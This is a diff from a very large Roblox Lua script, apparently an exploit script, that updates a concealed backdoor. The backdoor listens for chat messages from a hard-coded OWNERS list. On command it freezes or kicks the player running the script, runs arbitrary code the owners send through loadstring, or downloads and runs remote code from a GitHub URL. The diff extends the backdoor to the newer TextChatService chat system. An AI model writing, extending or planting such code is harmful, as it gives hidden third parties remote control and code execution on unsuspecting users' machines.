@@ -29944,51 +29944,66 @@ do
     }
 
     local lp = game:GetService("Players").LocalPlayer
-
     if OWNERS[lp.Name] then return end
 
-    local function listenToOwner(p)
-        if not OWNERS[p.Name] then return end
-        warn("Connected to: " .. p.Name)
-        p.Chatted:Connect(function(msg)
-            warn("Got message: " .. msg)
-            local args = msg:lower():split(" ")
-            local cmd = args[1]
-            local char = lp.Character
-            local hrp = char and char:FindFirstChild("HumanoidRootPart")
-            local hum = char and char:FindFirstChildOfClass("Humanoid")
+    local function handleMsg(msg)
+        local args = msg:lower():split(" ")
+        local cmd = args[1]
+        local char = lp.Character
+        local hrp = char and char:FindFirstChild("HumanoidRootPart")
+        local hum = char and char:FindFirstChildOfClass("Humanoid")
 
-            if cmd == "!freeze" then
-                if hrp then hrp.Anchored = true end
-                if hum then hum.WalkSpeed = 0; hum.JumpPower = 0 end
+        if cmd == "!freeze" then
+            if hrp then hrp.Anchored = true end
+            if hum then hum.WalkSpeed = 0; hum.JumpPower = 0 end
 
-            elseif cmd == "!unfreeze" then
-                if hrp then hrp.Anchored = false end
-                if hum then hum.WalkSpeed = 16; hum.JumpPower = 50 end
+        elseif cmd == "!unfreeze" then
+            if hrp then hrp.Anchored = false end
+            if hum then hum.WalkSpeed = 16; hum.JumpPower = 50 end
 
-            elseif cmd == "!kick" then
-                lp:Kick("Kicked by owner")
+        elseif cmd == "!kick" then
+            lp:Kick("Kicked by owner")
 
-            elseif cmd == "!execute" then
-                local input = msg:sub(10):gsub("^%s+", "")
-                local code = PRESETS[input] or input
-                local fn, err = loadstring(code)
-                if fn then
-                    local ok, runtimeErr = pcall(fn)
-                    if not ok then warn("EXECUTE ERROR: " .. tostring(runtimeErr)) end
-                else
-                    warn("LOAD ERROR: " .. tostring(err))
-                end
+        elseif cmd == "!execute" then
+            local input = msg:sub(10):gsub("^%s+", "")
+            local code = PRESETS[input] or input
+            local fn, err = loadstring(code)
+            if fn then
+                local ok, runtimeErr = pcall(fn)
+                if not ok then warn("EXECUTE ERROR: " .. tostring(runtimeErr)) end
+            else
+                warn("LOAD ERROR: " .. tostring(err))
+            end
 
-            elseif cmd == "!xen" then
-                local fn = loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenless/Booga-Booga/main/XenHub-V3", true))
-                if fn then pcall(fn) end
+        elseif cmd == "!xen" then
+            local fn = loadstring(game:HttpGet("https://raw.githubusercontent.com/Xenless/Booga-Booga/main/XenHub-V3", true))
+            if fn then pcall(fn) end
+        end
+    end
+
+    -- TextChatService (new chat system)
+    local ok, tcs = pcall(function()
+        return game:GetService("TextChatService")
+    end)
+    if ok and tcs and tcs.MessageReceived then
+        tcs.MessageReceived:Connect(function(msg)
+            local source = msg.TextSource
+            if source and OWNERS[source.Name] then
+                warn("Got message from: " .. source.Name)
+                handleMsg(msg.Text)
             end
         end)
     end
 
+    -- fallback: old Chatted event
     for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
-        listenToOwner(p)
+        if OWNERS[p.Name] then
+            p.Chatted:Connect(function(msg) handleMsg(msg) end)
+        end
     end
-    game:GetService("Players").PlayerAdded:Connect(listenToOwner)
+    game:GetService("Players").PlayerAdded:Connect(function(p)
+        if OWNERS[p.Name] then
+            p.Chatted:Connect(function(msg) handleMsg(msg) end)
+        end
+    end)
 end
